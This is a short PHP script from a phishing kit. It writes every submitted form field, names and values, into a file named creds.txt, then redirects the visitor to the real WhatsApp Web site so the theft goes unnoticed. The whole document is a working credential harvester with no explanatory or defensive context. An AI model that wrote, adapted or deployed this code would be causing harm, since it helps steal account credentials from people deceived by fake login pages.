<?php
header ('Location: https://web.whatsapp.com');
$handle = fopen("creds.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
